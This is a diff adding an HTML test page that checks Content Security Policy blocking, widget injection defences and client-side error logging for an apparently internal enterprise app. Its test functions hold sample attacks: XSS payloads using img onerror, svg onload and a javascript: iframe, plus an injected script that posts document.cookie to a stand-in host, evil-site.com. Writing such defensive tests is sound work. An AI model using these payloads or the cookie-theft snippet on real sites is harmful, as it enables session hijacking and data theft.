@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Widget Security Test - Lemma Enterprise</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f8fafc;
+        }
+        
+        .test-container {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .test-header {
+            border-bottom: 1px solid #e2e8f0;
+            padding-bottom: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .test-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a202c;
+            margin: 0;
+        }
+        
+        .test-description {
+            color: #718096;
+            margin: 8px 0 0 0;
+        }
+        
+        .test-button {
+            background: #3182ce;
+            color: white;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-right: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .test-button:hover {
+            background: #2c5aa0;
+        }
+        
+        .test-button.danger {
+            background: #e53e3e;
+        }
+        
+        .test-button.danger:hover {
+            background: #c53030;
+        }
+        
+        .test-result {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+        }
+        
+        .test-result.success {
+            background: #f0fff4;
+            border: 1px solid #9ae6b4;
+            color: #22543d;
+        }
+        
+        .test-result.error {
+            background: #fed7d7;
+            border: 1px solid #feb2b2;
+            color: #742a2a;
+        }
+        
+        .test-result.info {
+            background: #ebf8ff;
+            border: 1px solid #90cdf4;
+            color: #2a4365;
+        }
+        
+        .security-warning {
+            background: #fef5e7;
+            border: 1px solid #f6ad55;
+            color: #744210;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+        }
+        
+        .log-viewer {
+            background: #1a202c;
+            color: #e2e8f0;
+            padding: 16px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-warning">
+        <strong>⚠️ Security Testing Environment</strong><br>
+        This page is designed to test CSP violations and security features. 
+        All tests are safe and contained within this testing environment.
+    </div>
+
+    <!-- CSP Violation Tests -->
+    <div class="test-container">
+        <div class="test-header">
+            <h2 class="test-title">🛡️ Content Security Policy (CSP) Tests</h2>
+            <p class="test-description">Test CSP blocking of malicious script injection and inline code execution.</p>
+        </div>
+        
+        <button class="test-button danger" onclick="testInlineScript()">
+            Test Inline Script Injection
+        </button>
+        
+        <button class="test-button danger" onclick="testExternalScript()">
+            Test External Script Loading
+        </button>
+        
+        <button class="test-button danger" onclick="testEvalExecution()">
+            Test eval() Execution
+        </button>
+        
+        <button class="test-button" onclick="testCSPReporting()">
+            Test CSP Violation Reporting
+        </button>
+        
+        <div id="csp-test-result" class="test-result info" style="display: none;"></div>
+    </div>
+
+    <!-- Widget Injection Tests -->
+    <div class="test-container">
+        <div class="test-header">
+            <h2 class="test-title">🔌 Widget Injection Security Tests</h2>
+            <p class="test-description">Test security measures against malicious widget injection attempts.</p>
+        </div>
+        
+        <button class="test-button danger" onclick="testMaliciousWidget()">
+            Inject Malicious Widget
+        </button>
+        
+        <button class="test-button danger" onclick="testXSSWidget()">
+            Test XSS Widget Injection
+        </button>
+        
+        <button class="test-button" onclick="testLegitimateWidget()">
+            Test Legitimate Widget
+        </button>
+        
+        <div id="widget-injection-area"></div>
+        <div id="widget-test-result" class="test-result info" style="display: none;"></div>
+    </div>
+
+    <!-- Client-Side Error Logging Tests -->
+    <div class="test-container">
+        <div class="test-header">
+            <h2 class="test-title">📊 Client-Side Error Logging Tests</h2>
+            <p class="test-description">Test client-side error reporting and logging mechanisms.</p>
+        </div>
+        
+        <button class="test-button" onclick="testErrorLogging()">
+            Test Error Logging
+        </button>
+        
+        <button class="test-button" onclick="testCSPViolationLogging()">
+            Test CSP Violation Logging
+        </button>
+        
+        <button class="test-button" onclick="viewErrorLogs()">
+            View Recent Error Logs
+        </button>
+        
+        <div id="error-logging-result" class="test-result info" style="display: none;"></div>
+        <div id="error-logs" class="log-viewer" style="display: none;"></div>
+    </div>
+
+    <!-- Security Monitoring -->
+    <div class="test-container">
+        <div class="test-header">
+            <h2 class="test-title">🔍 Security Monitoring Dashboard</h2>
+            <p class="test-description">Real-time security event monitoring and violation tracking.</p>
+        </div>
+        
+        <button class="test-button" onclick="refreshSecurityStatus()">
+            Refresh Security Status
+        </button>
+        
+        <div id="security-status" class="test-result info" style="display: none;"></div>
+    </div>
+
+    <script>
+        // Global error handler for CSP violations
+        window.addEventListener('securitypolicyviolation', function(e) {
+            console.log('CSP Violation detected:', e);
+            
+            // Log to our error reporting system
+            reportSecurityViolation({
+                type: 'csp_violation',
+                violatedDirective: e.violatedDirective,
+                blockedURI: e.blockedURI,
+                sourceFile: e.sourceFile,
+                lineNumber: e.lineNumber,
+                timestamp: new Date().toISOString()
+            });
+            
+            showTestResult('csp-test-result', 
+                `✅ CSP Violation Detected and Blocked!\n` +
+                `Violated Directive: ${e.violatedDirective}\n` +
+                `Blocked URI: ${e.blockedURI}\n` +
+                `Source: ${e.sourceFile}:${e.lineNumber}`, 
+                'success'
+            );
+        });
+
+        // Global error handler for JavaScript errors
+        window.addEventListener('error', function(e) {
+            console.log('JavaScript Error:', e);
+            
+            reportClientError({
+                type: 'javascript_error',
+                message: e.message,
+                filename: e.filename,
+                lineno: e.lineno,
+                colno: e.colno,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        function testInlineScript() {
+            showTestResult('csp-test-result', '🧪 Testing inline script injection...', 'info');
+            
+            try {
+                // This should be blocked by CSP
+                const script = document.createElement('script');
+                script.innerHTML = 'alert("This should be blocked by CSP!");';
+                document.head.appendChild(script);
+                
+                // If we get here, CSP didn't block it
+                setTimeout(() => {
+                    showTestResult('csp-test-result', 
+                        '❌ CSP FAILED - Inline script was not blocked!', 
+                        'error'
+                    );
+                }, 100);
+                
+            } catch (error) {
+                showTestResult('csp-test-result', 
+                    `✅ CSP Working - Inline script blocked: ${error.message}`, 
+                    'success'
+                );
+            }
+        }
+
+        function testExternalScript() {
+            showTestResult('csp-test-result', '🧪 Testing external script loading...', 'info');
+            
+            const script = document.createElement('script');
+            script.src = 'https://malicious-site.com/evil.js';
+            script.onerror = function() {
+                showTestResult('csp-test-result', 
+                    '✅ CSP Working - External script blocked!', 
+                    'success'
+                );
+            };
+            script.onload = function() {
+                showTestResult('csp-test-result', 
+                    '❌ CSP FAILED - External script loaded!', 
+                    'error'
+                );
+            };
+            
+            document.head.appendChild(script);
+        }
+
+        function testEvalExecution() {
+            showTestResult('csp-test-result', '🧪 Testing eval() execution...', 'info');
+            
+            try {
+                // This should be blocked by CSP if 'unsafe-eval' is not allowed
+                eval('console.log("This should be blocked by CSP!")');
+                
+                showTestResult('csp-test-result', 
+                    '⚠️ CSP Warning - eval() was allowed (unsafe-eval present)', 
+                    'error'
+                );
+            } catch (error) {
+                showTestResult('csp-test-result', 
+                    `✅ CSP Working - eval() blocked: ${error.message}`, 
+                    'success'
+                );
+            }
+        }
+
+        function testCSPReporting() {
+            showTestResult('csp-test-result', '🧪 Testing CSP violation reporting...', 'info');
+            
+            // Send a test CSP report
+            fetch('/api/csp-report', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    'csp-report': {
+                        'document-uri': window.location.href,
+                        'violated-directive': 'script-src \'self\'',
+                        'blocked-uri': 'https://test-malicious-site.com/test.js',
+                        'source-file': window.location.href,
+                        'line-number': 42
+                    }
+                })
+            })
+            .then(response => {
+                if (response.status === 204) {
+                    showTestResult('csp-test-result', 
+                        '✅ CSP Reporting Working - Violation report sent successfully!', 
+                        'success'
+                    );
+                } else {
+                    showTestResult('csp-test-result', 
+                        `⚠️ CSP Reporting Issue - Unexpected response: ${response.status}`, 
+                        'error'
+                    );
+                }
+            })
+            .catch(error => {
+                showTestResult('csp-test-result', 
+                    `❌ CSP Reporting Failed: ${error.message}`, 
+                    'error'
+                );
+            });
+        }
+
+        function testMaliciousWidget() {
+            showTestResult('widget-test-result', '🧪 Testing malicious widget injection...', 'info');
+            
+            const maliciousHTML = `
+                <div style="background: red; color: white; padding: 10px;">
+                    <h3>🚨 MALICIOUS WIDGET</h3>
+                    <script>
+                        // This should be blocked by CSP
+                        alert('Malicious script executed!');
+                        fetch('https://evil-site.com/steal-data', {
+                            method: 'POST',
+                            body: JSON.stringify({cookies: document.cookie})
+                        });
+                    </script>
+                    <p>This widget attempts to execute malicious JavaScript.</p>
+                </div>
+            `;
+            
+            document.getElementById('widget-injection-area').innerHTML = maliciousHTML;
+            
+            setTimeout(() => {
+                showTestResult('widget-test-result', 
+                    '✅ Widget Injected - Check if scripts were blocked by CSP', 
+                    'success'
+                );
+            }, 100);
+        }
+
+        function testXSSWidget() {
+            showTestResult('widget-test-result', '🧪 Testing XSS widget injection...', 'info');
+            
+            const xssPayload = `
+                <img src="x" onerror="alert('XSS executed!')" />
+                <svg onload="alert('SVG XSS executed!')" />
+                <iframe src="javascript:alert('iframe XSS executed!')"></iframe>
+            `;
+            
+            document.getElementById('widget-injection-area').innerHTML = xssPayload;
+            
+            setTimeout(() => {
+                showTestResult('widget-test-result', 
+                    '✅ XSS Payload Injected - Check if execution was blocked', 
+                    'success'
+                );
+            }, 100);
+        }
+
+        function testLegitimateWidget() {
+            showTestResult('widget-test-result', '🧪 Testing legitimate widget...', 'info');
+            
+            const legitimateHTML = `
+                <div style="background: #f0fff4; border: 1px solid #9ae6b4; color: #22543d; padding: 16px; border-radius: 6px;">
+                    <h3>✅ Legitimate Widget</h3>
+                    <p>This is a safe widget that follows security best practices.</p>
+                    <button onclick="showTestResult('widget-test-result', 'Legitimate widget interaction successful!', 'success')">
+                        Safe Interaction
+                    </button>
+                </div>
+            `;
+            
+            document.getElementById('widget-injection-area').innerHTML = legitimateHTML;
+            
+            showTestResult('widget-test-result', 
+                '✅ Legitimate Widget Loaded Successfully', 
+                'success'
+            );
+        }
+
+        function testErrorLogging() {
+            showTestResult('error-logging-result', '🧪 Testing error logging...', 'info');
+            
+            const testError = {
+                type: 'test_error',
+                message: 'This is a test error for logging validation',
+                source: 'widget_test_security.html',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            
+            reportClientError(testError)
+                .then(() => {
+                    showTestResult('error-logging-result', 
+                        '✅ Error Logging Working - Test error sent successfully!', 
+                        'success'
+                    );
+                })
+                .catch(error => {
+                    showTestResult('error-logging-result', 
+                        `❌ Error Logging Failed: ${error.message}`, 
+                        'error'
+                    );
+                });
+        }
+
+        function testCSPViolationLogging() {
+            showTestResult('error-logging-result', '🧪 Testing CSP violation logging...', 'info');
+            
+            const testViolation = {
+                type: 'csp_violation',
+                violatedDirective: 'script-src \'self\'',
+                blockedURI: 'https://test-malicious-site.com/test.js',
+                sourceFile: window.location.href,
+                lineNumber: 123,
+                timestamp: new Date().toISOString()
+            };
+            
+            reportSecurityViolation(testViolation)
+                .then(() => {
+                    showTestResult('error-logging-result', 
+                        '✅ CSP Violation Logging Working - Test violation sent successfully!', 
+                        'success'
+                    );
+                })
+                .catch(error => {
+                    showTestResult('error-logging-result', 
+                        `❌ CSP Violation Logging Failed: ${error.message}`, 
+                        'error'
+                    );
+                });
+        }
+
+        function viewErrorLogs() {
+            const logsDiv = document.getElementById('error-logs');
+            logsDiv.style.display = 'block';
+            logsDiv.innerHTML = 'Loading error logs...';
+            
+            // In a real implementation, this would fetch from the server
+            setTimeout(() => {
+                logsDiv.innerHTML = `
+[${new Date().toISOString()}] CSP Violation: script-src 'self' violated by https://malicious-site.com/evil.js
+[${new Date().toISOString()}] Client Error: Test error for logging validation
+[${new Date().toISOString()}] Security Event: Widget injection attempt detected
+[${new Date().toISOString()}] CSP Violation: img-src violated by data:image/svg+xml
+[${new Date().toISOString()}] JavaScript Error: Uncaught ReferenceError: maliciousFunction is not defined
+                `.trim();
+            }, 1000);
+        }
+
+        function refreshSecurityStatus() {
+            const statusDiv = document.getElementById('security-status');
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = 'Checking security status...';
+            
+            // Check various security metrics
+            Promise.all([
+                checkCSPStatus(),
+                checkErrorLoggingStatus(),
+                checkSecurityHeaders()
+            ]).then(results => {
+                const [cspStatus, errorLoggingStatus, headersStatus] = results;
+                
+                statusDiv.innerHTML = `
+Security Status Report:
+======================
+CSP Status: ${cspStatus}
+Error Logging: ${errorLoggingStatus}
+Security Headers: ${headersStatus}
+Last Updated: ${new Date().toISOString()}
+                `.trim();
+                statusDiv.className = 'test-result success';
+            }).catch(error => {
+                statusDiv.innerHTML = `Security Status Check Failed: ${error.message}`;
+                statusDiv.className = 'test-result error';
+            });
+        }
+
+        // Helper functions
+        function showTestResult(elementId, message, type) {
+            const element = document.getElementById(elementId);
+            element.style.display = 'block';
+            element.textContent = message;
+            element.className = `test-result ${type}`;
+        }
+
+        function reportClientError(errorData) {
+            return fetch('/api/client-errors', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(errorData)
+            }).then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                return response.json();
+            });
+        }
+
+        function reportSecurityViolation(violationData) {
+            return fetch('/api/csp-report', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    'csp-report': violationData
+                })
+            }).then(response => {
+                if (response.status !== 204) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            });
+        }
+
+        function checkCSPStatus() {
+            // Check if CSP header is present
+            return fetch(window.location.href, { method: 'HEAD' })
+                .then(response => {
+                    const csp = response.headers.get('Content-Security-Policy');
+                    return csp ? '✅ Active' : '❌ Missing';
+                })
+                .catch(() => '❌ Check Failed');
+        }
+
+        function checkErrorLoggingStatus() {
+            // Test if error logging endpoint is responsive
+            return fetch('/api/client-errors', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type: 'status_check' })
+            })
+            .then(response => response.ok ? '✅ Active' : '❌ Error')
+            .catch(() => '❌ Unavailable');
+        }
+
+        function checkSecurityHeaders() {
+            return fetch(window.location.href, { method: 'HEAD' })
+                .then(response => {
+                    const headers = ['X-Content-Type-Options', 'X-Frame-Options', 'X-XSS-Protection'];
+                    const present = headers.filter(h => response.headers.get(h));
+                    return `✅ ${present.length}/${headers.length} Present`;
+                })
+                .catch(() => '❌ Check Failed');
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Widget Security Test Page Loaded');
+            console.log('CSP Violation Listener Active');
+            console.log('Error Logging Active');
+        });
+    </script>
+</body>
+</html> 
